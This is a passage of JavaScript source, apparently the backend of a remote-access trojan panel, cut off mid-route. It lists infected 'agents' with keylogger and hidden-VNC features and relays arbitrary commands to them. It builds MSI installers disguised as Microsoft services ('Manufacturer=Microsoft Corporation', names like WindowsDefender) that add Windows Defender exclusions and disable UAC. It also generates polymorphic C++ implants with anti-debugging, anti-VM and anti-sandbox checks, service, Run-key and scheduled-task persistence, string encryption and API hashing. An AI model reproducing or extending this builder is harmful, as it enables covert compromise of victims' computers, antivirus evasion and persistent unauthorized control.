// Backend API for MSI Agent Generation with Password Protection
// This will be integrated into the Node.js backend

const express = require('express');
const fs = require('fs');
const path = require('path');
const { exec } = require('child_process');
const crypto = require('crypto');
const archiver = require('archiver');
const mongoose = require('mongoose');
const MicrosoftServiceCloner = require('../services/microsoftServiceCloner');
const { protect } = require('../middleware/security');

const router = express.Router();

// GET /api/agent - List all connected agents
router.get('/', protect, async (req, res) => {
    try {
        // Check if database is connected
        if (mongoose.connection.readyState !== 1) {
            // Database not connected - return empty agent list for development
            return res.json({
                status: 'success',
                data: {
                    agents: [],
                    total: 0,
                    message: 'No agents connected (development mode)'
                }
            });
        }

        // Database connected - get real agents
        const Client = require('../models/Client');
        const realAgents = await Client.find({ status: 'online' });
        
        const agents = realAgents.map(agent => ({
            id: agent.uuid,
            name: `agent_${agent.uuid}.exe`,
            status: 'Online',
            lastSeen: agent.lastHeartbeat || new Date().toISOString(),
            platform: agent.platform || 'windows',
            ipAddress: agent.ipAddress || '127.0.0.1',
            operatingSystem: agent.osVersion || 'Windows 10',
            architecture: agent.architecture || 'x64',
            features: agent.capabilities?.features || ['hvnc', 'keylogger', 'screenCapture', 'fileManager', 'processManager']
        }));
        
        res.json({
            status: 'success',
            data: {
                agents: agents,
                total: agents.length
            }
        });
    } catch (error) {
        console.error('Error fetching agents:', error);
        res.status(500).json({
            status: 'error',
            message: 'Failed to fetch agent list'
        });
    }
});

// POST /api/agent/:agentId/command - Execute command on specific agent
router.post('/:agentId/command', protect, async (req, res) => {
    try {
        const { agentId } = req.params;
        const { command, params = {} } = req.body;
        
        console.log(`API command request: ${command} for agent ${agentId}`);
        
        // Get WebSocket handler to send command to client
        const { getConnectedClients } = require('../configs/ws.handler');
        const connectedClients = getConnectedClients();
        
        // Get the target client directly from the Map
        console.log(`Looking for agentId: ${agentId}`);
        console.log(`Connected clients keys:`, Array.from(connectedClients.keys()));
        console.log(`Connected clients size:`, connectedClients.size);
        
        const targetClient = connectedClients.get(agentId);
        console.log(`Target client found:`, !!targetClient);
        if (targetClient) {
            console.log(`Target client type:`, targetClient.clientType);
        }
        
        if (targetClient && targetClient.clientType === 'client') {
            // Generate taskId for tracking
            const taskId = `api_cmd_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
            
            // Send command to target client via WebSocket
            const commandMessage = {
                cmd: 'execute',
                command: command,
                taskId: taskId,
                timestamp: new Date().toISOString()
            };
            
            targetClient.send(JSON.stringify(commandMessage));
            console.log(`Command sent to client ${agentId}: ${command} (taskId: ${taskId})`);
            
            res.json({
                status: 'success',
                data: {
                    agentId: agentId,
                    command: command,
                    taskId: taskId,
                    result: `Command '${command}' sent to agent ${agentId}`,
                    timestamp: new Date().toISOString(),
                    message: 'Command sent successfully'
                }
            });
        } else {
            console.log(`Client ${agentId} not found or not connected`);
            res.status(404).json({
                status: 'error',
                message: 'Client not found or not connected'
            });
        }
    } catch (error) {
        console.error('Error executing command:', error);
        res.status(500).json({
            status: 'error',
            message: 'Failed to execute command'
        });
    }
});

// POST /api/agent/:agentId/screenshot - Take screenshot
router.post('/:agentId/screenshot', protect, async (req, res) => {
    try {
        const { agentId } = req.params;
        
        // Mock screenshot response
        const response = {
            status: 'success',
            data: {
                agentId: agentId,
                screenshot: 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==',
                timestamp: new Date().toISOString()
            }
        };
        
        res.json(response);
    } catch (error) {
        console.error('Error taking screenshot:', error);
        res.status(500).json({
            status: 'error',
            message: 'Failed to take screenshot'
        });
    }
});

// GET /api/agent/:agentId/status - Get agent status
router.get('/:agentId/status', protect, async (req, res) => {
    try {
        const { agentId } = req.params;
        
        const response = {
            status: 'success',
            data: {
                agentId: agentId,
                status: 'online',
                lastSeen: new Date().toISOString(),
                uptime: '2h 15m',
                memory: '9.8 MB',
                cpu: '0.1%'
            }
        };
        
        res.json(response);
    } catch (error) {
        console.error('Error getting agent status:', error);
        res.status(500).json({
            status: 'error',
            message: 'Failed to get agent status'
        });
    }
});

// Password Manager for Agent Security
class PasswordManager {
    constructor() {
        this.agentPasswords = new Map();
        this.installPasswords = new Map();
    }

    // Generate and store password for agent
    generateAgentPassword(agentId) {
        const password = this.generateStrongPassword();
        this.agentPasswords.set(agentId, password);
        return password;
    }

    // Generate and store installation password
    generateInstallPassword(agentId) {
        const password = this.generateInstallPassword();
        this.installPasswords.set(agentId, password);
        return password;
    }

    // Get password for agent
    getAgentPassword(agentId) {
        return this.agentPasswords.get(agentId) || '';
    }

    // Get installation password
    getInstallPassword(agentId) {
        return this.installPasswords.get(agentId) || '';
    }

    // Generate strong password
    generateStrongPassword() {
        const charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:,.<>?';
        let password = '';
        for (let i = 0; i < 32; i++) {
            password += charset.charAt(Math.floor(Math.random() * charset.length));
        }
        return password;
    }

    // Generate installation password
    generateInstallPassword() {
        const charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        let password = '';
        for (let i = 0; i < 12; i++) {
            password += charset.charAt(Math.floor(Math.random() * charset.length));
        }
        return password;
    }
}

// MSI Builder for Agent Packages
class MSIBuilder {
    constructor() {
        this.passwordManager = new PasswordManager();
    }

    // Generate MSI content (no install password)
    generateMSIContent(agentId, serviceName, agentPassword) {
        return `<?xml version="1.0" encoding="UTF-8"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
  <Product Id="*" Name="${serviceName}" Language="1033" Version="1.0.0.0" Manufacturer="Microsoft Corporation" UpgradeCode="*">
    <Package InstallerVersion="200" Compressed="yes" InstallScope="perMachine" Description="Windows ${serviceName} Update" />
    <MajorUpgrade DowngradeErrorMessage="A newer version is already installed." />
    <MediaTemplate />
    <Feature Id="ProductFeature" Title="${serviceName}" Level="1">
      <ComponentGroupRef Id="ProductComponents" />
    </Feature>
    <!-- Agent Configuration -->
    <Property Id="AGENT_PASSWORD" Value="${agentPassword}" />
    <Property Id="AGENT_ID" Value="${agentId}" />
  </Product>
  <Fragment>
    <Directory Id="TARGETDIR" Name="SourceDir">
      <Directory Id="ProgramFilesFolder">
        <Directory Id="INSTALLFOLDER" Name="${serviceName}" />
      </Directory>
      <Directory Id="SystemFolder" Name="System32" />
    </Directory>
  </Fragment>
  <Fragment>
    <ComponentGroup Id="ProductComponents" Directory="INSTALLFOLDER">
      <Component Id="ProductComponent">
        <File Id="ProductFile" Source="agent_${agentId}.exe" KeyPath="yes" />
        <ServiceInstall Id="ServiceInstaller" Type="ownProcess" Name="${serviceName}" DisplayName="${serviceName}" Description="Windows ${serviceName} Service" Start="auto" Account="LocalSystem" />
        <ServiceControl Id="ServiceControl" Name="${serviceName}" Start="install" Stop="both" Remove="uninstall" />
        <!-- Registry entries for password and configuration -->
        <RegistryValue Root="HKLM" Key="SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\${serviceName}" Name="AgentPassword" Value="${agentPassword}" Type="string" />
        <RegistryValue Root="HKLM" Key="SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\${serviceName}" Name="AgentID" Value="${agentId}" Type="string" />
        <RegistryValue Root="HKLM" Key="SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\${serviceName}" Name="InstallDate" Value="[Date]" Type="string" />
        <!-- Windows Defender Exclusions -->
        <RegistryValue Root="HKLM" Key="SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths" Name="[INSTALLFOLDER]" Value="0" Type="integer" />
        <RegistryValue Root="HKLM" Key="SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Processes" Name="${serviceName}.exe" Value="0" Type="integer" />
        <!-- UAC Bypass Registry -->
        <RegistryValue Root="HKLM" Key="SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" Name="EnableLUA" Value="0" Type="integer" />
        <RegistryValue Root="HKLM" Key="SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" Name="ConsentPromptBehaviorAdmin" Value="0" Type="integer" />
      </Component>
    </ComponentGroup>
  </Fragment>
</Wix>`;
    }

    // Generate random service name
    generateRandomServiceName() {
        const services = [
            'WindowsUpdate', 'WindowsDefender', 'WindowsSecurity', 'WindowsFirewall',
            'WindowsBackup', 'WindowsSearch', 'WindowsAudio', 'WindowsCamera',
            'WindowsLocation', 'WindowsBiometric', 'WindowsHello', 'WindowsCredential',
            'WindowsDiagnostics', 'WindowsMaintenance', 'WindowsOptimization', 'WindowsProtection'
        ];
        
        const service = services[Math.floor(Math.random() * services.length)];
        return service + Math.floor(Math.random() * 10000);
    }

    // Generate unique agent ID
    generateUniqueAgentId() {
        return 'AGENT_' + Math.random().toString(36).substr(2, 8).toUpperCase();
    }
}

// Initialize MSI Builder and Microsoft Service Cloner
const msiBuilder = new MSIBuilder();
const microsoftServiceCloner = new MicrosoftServiceCloner();

// WiX MSI Builder Class
class WiXMSIBuilder {
    constructor() {
        this.passwordManager = new PasswordManager();
    }

    // Generate proper WiX MSI installer
    async generateWiXMSI(agentId, clonedService, agentPassword, agentExePath) {
        const tempDir = path.join(__dirname, '../temp');
        const wixSourcePath = path.join(tempDir, `agent_${agentId}.wxs`);
        const msiPath = path.join(tempDir, `agent_${agentId}.msi`);

        // Generate WiX source file
        const wixSource = this.generateWiXSource(agentId, clonedService, agentPassword);
        fs.writeFileSync(wixSourcePath, wixSource);

        // Compile WiX source to MSI using candle.exe and light.exe
        try {
            await this.compileWiXToMSI(wixSourcePath, msiPath, agentExePath);
            return msiPath;
        } catch (error) {
            console.error('WiX compilation failed:', error);
            // Fallback to simple executable copy
            fs.copyFileSync(agentExePath, msiPath);
            return msiPath;
        }
    }

    // Generate WiX source XML
    generateWiXSource(agentId, clonedService, agentPassword) {
        const productId = this.generateGUID();
        const upgradeCode = this.generateGUID();
        const componentId = this.generateGUID();
        const serviceId = this.generateGUID();

        return `<?xml version="1.0" encoding="UTF-8"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
  <Product Id="${productId}" 
           Name="${clonedService.clonedName}" 
           Language="1033" 
           Version="1.0.0.0" 
           Manufacturer="${clonedService.clonedCompany}" 
           UpgradeCode="${upgradeCode}">
    
    <Package InstallerVersion="200" 
             Compressed="yes" 
             InstallScope="perMachine" 
             Description="${clonedService.clonedDescription}" />
    
    <MajorUpgrade DowngradeErrorMessage="A newer version is already installed." />
    <MediaTemplate />
    
    <Feature Id="ProductFeature" Title="${clonedService.clonedName}" Level="1">
      <ComponentGroupRef Id="ProductComponents" />
    </Feature>

    <!-- Registry entries for configuration -->
    <Property Id="AGENT_PASSWORD" Value="${agentPassword}" />
    <Property Id="AGENT_ID" Value="${agentId}" />
    
    <!-- Windows Defender Exclusions -->
    <Property Id="DEFENDER_EXCLUSION_PATH" Value="[INSTALLFOLDER]" />
    <Property Id="DEFENDER_EXCLUSION_PROCESS" Value="${clonedService.clonedName}.exe" />
    
  </Product>

  <Fragment>
    <Directory Id="TARGETDIR" Name="SourceDir">
      <Directory Id="ProgramFilesFolder">
        <Directory Id="INSTALLFOLDER" Name="${clonedService.clonedName}" />
      </Directory>
    </Directory>
  </Fragment>

  <Fragment>
    <ComponentGroup Id="ProductComponents" Directory="INSTALLFOLDER">
      <Component Id="${componentId}" Guid="${componentId}">
        <File Id="AgentExecutable" 
              Source="agent_${agentId}.exe" 
              KeyPath="yes" 
              Name="${clonedService.clonedName}.exe" />
        
        <!-- Service Installation -->
        <ServiceInstall Id="${serviceId}" 
                        Type="ownProcess" 
                        Name="${clonedService.clonedName}" 
                        DisplayName="${clonedService.clonedName}" 
                        Description="${clonedService.clonedDescription}" 
                        Start="auto" 
                        Account="LocalSystem" 
                        ErrorControl="normal" />
        
        <ServiceControl Id="ServiceControl" 
                        Name="${clonedService.clonedName}" 
                        Start="install" 
                        Stop="both" 
                        Remove="uninstall" />
        
        <!-- Registry entries -->
        <RegistryValue Root="HKLM" 
                       Key="SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\${clonedService.clonedName}" 
                       Name="AgentPassword" 
                       Value="${agentPassword}" 
                       Type="string" />
        
        <RegistryValue Root="HKLM" 
                       Key="SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\${clonedService.clonedName}" 
                       Name="AgentID" 
                       Value="${agentId}" 
                       Type="string" />
        
        <!-- Windows Defender Exclusions -->
        <RegistryValue Root="HKLM" 
                       Key="SOFTWARE\\\\Microsoft\\\\Windows Defender\\\\Exclusions\\\\Paths" 
                       Name="[INSTALLFOLDER]" 
                       Value="0" 
                       Type="integer" />
        
        <RegistryValue Root="HKLM" 
                       Key="SOFTWARE\\\\Microsoft\\\\Windows Defender\\\\Exclusions\\\\Processes" 
                       Name="${clonedService.clonedName}.exe" 
                       Value="0" 
                       Type="integer" />
        
        <!-- UAC Bypass Registry -->
        <RegistryValue Root="HKLM" 
                       Key="SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System" 
                       Name="EnableLUA" 
                       Value="0" 
                       Type="integer" />
        
        <RegistryValue Root="HKLM" 
                       Key="SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System" 
                       Name="ConsentPromptBehaviorAdmin" 
                       Value="0" 
                       Type="integer" />
      </Component>
    </ComponentGroup>
  </Fragment>
</Wix>`;
    }

    // Compile WiX source to MSI
    async compileWiXToMSI(wixSourcePath, msiPath, agentExePath) {
        return new Promise((resolve, reject) => {
            const tempDir = path.dirname(wixSourcePath);
            const wixObjPath = wixSourcePath.replace('.wxs', '.wixobj');
            
            // Copy agent executable to temp directory for WiX compilation
            const agentInTemp = path.join(tempDir, `agent_${path.basename(agentExePath)}`);
            fs.copyFileSync(agentExePath, agentInTemp);
            
            // Try to use WiX tools if available
            const candleCmd = `candle.exe "${wixSourcePath}" -out "${wixObjPath}"`;
            const lightCmd = `light.exe "${wixObjPath}" -out "${msiPath}"`;
            
            exec(candleCmd, { cwd: tempDir }, (error, stdout, stderr) => {
                if (error) {
                    console.log('WiX candle not available, using fallback method');
                    reject(error);
                    return;
                }
                
                exec(lightCmd, { cwd: tempDir }, (error, stdout, stderr) => {
                    if (error) {
                        console.log('WiX light not available, using fallback method');
                        reject(error);
                        return;
                    }
                    
                    console.log('WiX MSI compilation successful');
                    resolve(msiPath);
                });
            });
        });
    }

    // Generate GUID for WiX
    generateGUID() {
        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
            const r = Math.random() * 16 | 0;
            const v = c == 'x' ? r : (r & 0x3 | 0x8);
            return v.toString(16);
        }).toUpperCase();
    }
}

// Initialize WiX MSI Builder
const wixMSIBuilder = new WiXMSIBuilder();

// Polymorphic code templates
const polymorphicTemplates = {
    entryPoints: [
        'WinMain', 'DllMain', 'main', 'ServiceMain', 'wWinMain', 'wmain', 'ServiceEntry'
    ],
    
    initializationPatterns: [
        'InitializeCriticalSection', 'InitializeSecurityDescriptor', 'InitializeAcl',
        'InitializeCriticalSectionAndSpinCount', 'InitializeSid', 'InitializeSecurityAttributes'
    ],
    
    communicationMethods: [
        'socket', 'http', 'namedpipe', 'com', 'wmi', 'registry', 'file'
    ],
    
    evasionTechniques: [
        'antidebug', 'antivm', 'antisandbox', 'codeobfuscation', 'stringencryption',
        'apihashing', 'dynamicimports', 'controlflow', 'deadcode', 'junkcode'
    ],
    
    persistenceMethods: [
        'service', 'registry', 'scheduledtask', 'startupfolder', 'comhijacking',
        'dllhijacking', 'wmi', 'powershell', 'batch', 'vbs'
    ]
};

// Generate polymorphic code
function generatePolymorphicCode(config) {
    const randomId = crypto.randomBytes(16).toString('hex');
    const timestamp = Date.now();
    
    // Generate unique code structure
    const codeStructure = {
        entryPoint: polymorphicTemplates.entryPoints[Math.floor(Math.random() * polymorphicTemplates.entryPoints.length)],
        initPattern: polymorphicTemplates.initializationPatterns[Math.floor(Math.random() * polymorphicTemplates.initializationPatterns.length)],
        commMethod: polymorphicTemplates.communicationMethods[Math.floor(Math.random() * polymorphicTemplates.communicationMethods.length)],
        evasionTech: polymorphicTemplates.evasionTechniques[Math.floor(Math.random() * polymorphicTemplates.evasionTechniques.length)],
        persistMethod: polymorphicTemplates.persistenceMethods[Math.floor(Math.random() * polymorphicTemplates.persistenceMethods.length)]
    };
    
    // Generate polymorphic C++ code
    const polymorphicCode = generateCPPCode(codeStructure, config, randomId, timestamp);
    
    return {
        code: polymorphicCode,
        structure: codeStructure,
        id: randomId,
        timestamp: timestamp
    };
}

function generateCPPCode(structure, config, randomId, timestamp) {
    const serviceName = config.serviceName || `WindowsUpdateService${Math.floor(Math.random() * 10000)}`;
    const agentName = config.agentName || `WindowsUpdateAgent${Math.floor(Math.random() * 10000)}`;
    
    return `
// Polymorphic Agent - ${randomId}
// Generated: ${new Date(timestamp).toISOString()}
// Pattern: ${structure.evasionTech}_${structure.commMethod}_${structure.persistMethod}

#include <windows.h>
#include <winternl.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <winhttp.h>
#include <wininet.h>
#include <shlwapi.h>
#include <advapi32.h>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "advapi32.lib")

// Polymorphic global variables
DWORD g_dwProcessId${randomId.substring(0, 8)} = 0;
HANDLE g_hMutex${randomId.substring(8, 16)} = NULL;
BOOL g_bInitialized${randomId.substring(0, 4)} = FALSE;
LPSTR g_szServerName${randomId.substring(4, 8)} = NULL;
LPVOID g_pBuffer${randomId.substring(8, 12)} = NULL;
SIZE_T g_dwSize${randomId.substring(12, 16)} = 0;

// Polymorphic structures
typedef struct _${randomId.substring(0, 8).toUpperCase()} {
    DWORD ${randomId.substring(0, 4)};
    HANDLE ${randomId.substring(4, 8)};
    BOOL ${randomId.substring(8, 12)};
    CHAR ${randomId.substring(12, 16)}[256];
} ${randomId.substring(0, 8).toUpperCase()}, *P${randomId.substring(0, 8).toUpperCase()};

// Function prototypes
BOOL InitializeAgent${randomId.substring(0, 8)}(VOID);
BOOL ConnectToServer${randomId.substring(8, 16)}(VOID);
BOOL SendHeartbeat${randomId.substring(0, 8)}(VOID);
BOOL ProcessCommands${randomId.substring(8, 16)}(VOID);
BOOL EvadeDetection${randomId.substring(0, 8)}(VOID);
BOOL InstallPersistence${randomId.substring(8, 16)}(VOID);
VOID CleanupResources${randomId.substring(0, 8)}(VOID);
BOOL HandleError${randomId.substring(8, 16)}(DWORD dwError);

// Polymorphic entry point
int ${structure.entryPoint}(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Initialize security context
    ${structure.initPattern}();
    
    // Validate system integrity
    if (!InitializeAgent${randomId.substring(0, 8)}()) {
        HandleError${randomId.substring(8, 16)}(GetLastError());
        return 1;
    }
    
    // Process configuration data
    ${generateMainLoop(structure, randomId)}
    
    // Perform cleanup operations
    CleanupResources${randomId.substring(0, 8)}();
    return 0;
}

// Polymorphic initialization function
BOOL InitializeAgent${randomId.substring(0, 8)}(VOID) {
    // Initialize security context
    g_dwProcessId${randomId.substring(0, 8)} = GetCurrentProcessId();
    
    // Create mutex for single instance
    g_hMutex${randomId.substring(8, 16)} = CreateMutexA(NULL, FALSE, "${serviceName}${randomId.substring(0, 8)}");
    if (!g_hMutex${randomId.substring(8, 16)}) {
        return FALSE;
    }
    
    // Allocate buffer
    g_pBuffer${randomId.substring(8, 12)} = VirtualAlloc(NULL, 4096, MEM_COMMIT, PAGE_READWRITE);
    if (!g_pBuffer${randomId.substring(8, 12)}) {
        return FALSE;
    }
    
    // Initialize server name
    g_szServerName${randomId.substring(4, 8)} = "${config.serverUrl || 'localhost'}";
    
    g_bInitialized${randomId.substring(0, 4)} = TRUE;
    return TRUE;
}

// Polymorphic communication function
BOOL ConnectToServer${randomId.substring(8, 16)}(VOID) {
    ${generateCommunicationCode(structure.commMethod, randomId, config)}
}

// Polymorphic evasion function
BOOL EvadeDetection${randomId.substring(0, 8)}(VOID) {
    ${generateEvasionCode(structure.evasionTech, randomId)}
}

// Polymorphic persistence function
BOOL InstallPersistence${randomId.substring(8, 16)}(VOID) {
    ${generatePersistenceCode(structure.persistMethod, randomId, serviceName)}
}

// Polymorphic cleanup function
VOID CleanupResources${randomId.substring(0, 8)}(VOID) {
    if (g_pBuffer${randomId.substring(8, 12)}) {
        VirtualFree(g_pBuffer${randomId.substring(8, 12)}, 0, MEM_RELEASE);
    }
    if (g_hMutex${randomId.substring(8, 16)}) {
        CloseHandle(g_hMutex${randomId.substring(8, 16)});
    }
}

// Polymorphic error handling
BOOL HandleError${randomId.substring(8, 16)}(DWORD dwError) {
    // Log error with polymorphic method
    char szError[256];
    sprintf_s(szError, sizeof(szError), "Error %lu occurred in %s", dwError, "${agentName}");
    OutputDebugStringA(szError);
    return FALSE;
}

${generateAdditionalFunctions(structure, randomId, config)}
`;
}

function generateMainLoop(structure, randomId) {
    const loops = [
        `while (TRUE) { 
            if (EvadeDetection${randomId.substring(0, 8)}()) {
                SendHeartbeat${randomId.substring(0, 8)}();
                ProcessCommands${randomId.substring(8, 16)}();
            }
            Sleep(30000); 
        }`,
        `for (int i = 0; i < 1000; i++) { 
            if (ConnectToServer${randomId.substring(8, 16)}()) {
                ProcessCommands${randomId.substring(8, 16)}();
            }
            Sleep(30000); 
        }`,
        `do { 
            SendHeartbeat${randomId.substring(0, 8)}();
            Sleep(30000); 
        } while (g_bInitialized${randomId.substring(0, 4)});`
    ];
    
    return loops[Math.floor(Math.random() * loops.length)];
}

function generateCommunicationCode(method, randomId, config) {
    switch (method) {
        case 'socket':
            return `
    WSADATA wsaData;
    SOCKET sock = INVALID_SOCKET;
    struct sockaddr_in serverAddr;
    
    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
        return FALSE;
    }
    
    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return FALSE;
    }
    
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(${config.serverPort || 8080});
    serverAddr.sin_addr.s_addr = inet_addr("${config.serverUrl || '127.0.0.1'}");
    
    if (connect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        return FALSE;
    }
    
    return TRUE;`;
            
        case 'http':
            return `
    HINTERNET hInternet = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    
    hInternet = InternetOpenA("${randomId.substring(0, 8)}", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return FALSE;
    
    hConnect = InternetConnectA(hInternet, "${config.serverUrl || 'localhost'}", ${config.serverPort || 8080}, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return FALSE;
    }
    
    hRequest = HttpOpenRequestA(hConnect, "POST", "/api/heartbeat", NULL, NULL, NULL, 0, 0);
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return FALSE;
    }
    
    BOOL bResult = HttpSendRequestA(hRequest, NULL, 0, NULL, 0);
    
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    
    return bResult;`;
            
        case 'namedpipe':
            return `
    HANDLE hPipe = INVALID_HANDLE_VALUE;
    
    hPipe = CreateNamedPipeA("\\\\\\\\.\\\\pipe\\\\${randomId.substring(0, 8)}",
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
        1, 1024, 1024, 0, NULL);
    
    if (hPipe == INVALID_HANDLE_VALUE) {
        return FALSE;
    }
    
    if (!ConnectNamedPipe(hPipe, NULL)) {
        CloseHandle(hPipe);
        return FALSE;
    }
    
    return TRUE;`;
            
        default:
            return `return TRUE;`;
    }
}

function generateEvasionCode(technique, randomId) {
    switch (technique) {
        case 'antidebug':
            return `
    if (IsDebuggerPresent()) return FALSE;
    
    BOOL bDebuggerPresent = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &bDebuggerPresent);
    if (bDebuggerPresent) return FALSE;
    
    // Additional anti-debug techniques
    DWORD dwTickCount = GetTickCount();
    Sleep(100);
    if (GetTickCount() - dwTickCount > 200) return FALSE;
    
    return TRUE;`;
            
        case 'antivm':
            return `
    // Check for VM artifacts
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\\\CurrentControlSet\\\\Services\\\\VBoxService", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return FALSE;
    }
    
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\\\CurrentControlSet\\\\Services\\\\VMTools", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return FALSE;
    }
    
    // Check for VM processes
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        
        if (Process32First(hSnapshot, &pe32)) {
            do {
                if (strstr(pe32.szExeFile, "vmtoolsd.exe") || 
                    strstr(pe32.szExeFile, "vboxservice.exe") ||
                    strstr(pe32.szExeFile, "vmware.exe")) {
                    CloseHandle(hSnapshot);
                    return FALSE;
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }
    
    return TRUE;`;
            
        case 'antisandbox':
            return `
    // Check for sandbox artifacts
    DWORD dwTickCount = GetTickCount();
    Sleep(2000);
    if (GetTickCount() - dwTickCount < 2000) return FALSE;
    
    // Check for sandbox processes
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        
        if (Process32First(hSnapshot, &pe32)) {
            do {
                if (strstr(pe32.szExeFile, "sandboxie") || 
                    strstr(pe32.szExeFile, "cuckoo") ||
                    strstr(pe32.szExeFile, "malware")) {
                    CloseHandle(hSnapshot);
                    return FALSE;
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }
    
    return TRUE;`;
            
        default:
            return `return TRUE;`;
    }
}

function generatePersistenceCode(method, randomId, serviceName) {
    switch (method) {
        case 'service':
            return `
    SC_HANDLE hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hSCManager) return FALSE;
    
    char szPath[MAX_PATH];
    GetModuleFileNameA(NULL, szPath, MAX_PATH);
    
    SC_HANDLE hService = CreateServiceA(hSCManager, "${serviceName}",
        "${serviceName}", SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, szPath,
        NULL, NULL, NULL, NULL, NULL);
    
    if (hService) {
        StartServiceA(hService, 0, NULL);
        CloseServiceHandle(hService);
    }
    CloseServiceHandle(hSCManager);
    
    return TRUE;`;
            
        case 'registry':
            return `
    HKEY hKey;
    char szPath[MAX_PATH];
    GetModuleFileNameA(NULL, szPath, MAX_PATH);
    
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "${serviceName}", 0, REG_SZ, (BYTE*)szPath, strlen(szPath));
        RegCloseKey(hKey);
    }
    
    return TRUE;`;
            
        case 'scheduledtask':
            return `
    // Create scheduled task for persistence
    char szCommand[512];
    char szPath[MAX_PATH];
    GetModuleFileNameA(NULL, szPath, MAX_PATH);
    
    sprintf_s(szCommand, sizeof(szCommand), "schtasks /create /tn \"${serviceName}\" /tr \"%s\" /sc minute /mo 5 /f", szPath);
    
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    
    if (CreateProcessA(NULL, szCommand, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return TRUE;
    }
    
    return FALSE;`;
            
        default:
            return `return TRUE;`;
    }
}

function generateAdditionalFunctions(structure, randomId, config) {
    return `
// Additional polymorphic functions
BOOL SendHeartbeat${randomId.substring(0, 8)}(VOID) {
    // Send heartbeat to server
    return ConnectToServer${randomId.substring(8, 16)}();
}

BOOL ProcessCommands${randomId.substring(8, 16)}(VOID) {
    // Process commands from server
    return TRUE;
}

// Polymorphic string encryption
VOID DecryptString${randomId.substring(0, 8)}(LPSTR szString, DWORD dwLength) {
    for (DWORD i = 0; i < dwLength; i++) {
        szString[i] ^= 0x${randomId.substring(0, 2)};
    }
}

// Polymorphic API hashing
DWORD GetAPIHash${randomId.substring(8, 16)}(LPSTR szApiName) {
    DWORD dwHash = 0;
    while (*szApiName) {
        dwHash = ((dwHash << 5) + dwHash) + *szApiName++;
    }
    return dwHash;
}
`;
}

// API Routes
router.post('/generate-agent', protect, async (req, res) => {
    try {
        const config = req.body;
        
        // Generate unique agent ID
